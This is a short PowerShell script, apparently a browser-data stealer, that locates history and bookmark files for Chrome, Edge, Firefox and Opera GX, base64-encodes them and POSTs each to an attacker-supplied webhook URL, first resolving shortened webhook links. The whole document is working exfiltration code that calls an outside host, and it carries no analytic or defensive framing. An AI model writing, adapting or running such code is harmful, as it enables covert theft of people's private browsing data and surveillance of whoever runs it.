# shortened URL Detection
if ($whuri.Length -ne 121) {
    Write-Host "Shortened Webhook URL Detected.."
    $whuri = (Invoke-RestMethod -Uri $whuri).url
}

# Define paths for data storage
$Paths = @{
    'chrome_history'    = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
    'chrome_bookmarks'  = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
    'edge_history'      = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History"
    'edge_bookmarks'    = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks"
    'firefox_history'   = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
    'opera_history'     = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"
    'opera_bookmarks'   = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"
}

# Define browsers and data
$Browsers = @('chrome', 'edge', 'firefox', 'opera')
$DataValues = @('history', 'bookmarks')

foreach ($Browser in $Browsers) {
    foreach ($DataValue in $DataValues) {
        $PathKey = "${Browser}_${DataValue}"
        $Path = $Paths[$PathKey]

        if (Test-Path $Path) {
            try {
                $fileName = [System.IO.Path]::GetFileName($Path)
                $fileBytes = [System.IO.File]::ReadAllBytes($Path)
                $fileBase64 = [Convert]::ToBase64String($fileBytes)

                $body = @{
                    content = "Browser: $Browser, DataType: $DataValue"
                    file = $fileBase64
                }

                Invoke-RestMethod -Uri $whuri -Method Post -Body (ConvertTo-Json $body) -ContentType "application/json"

                Write-Host "Sent $Path to webhook."
            } catch {
                Write-Host "Error sending $Path: $_"
            }
        } else {
            Write-Host "Path not found: $Path"
        }
    }
}
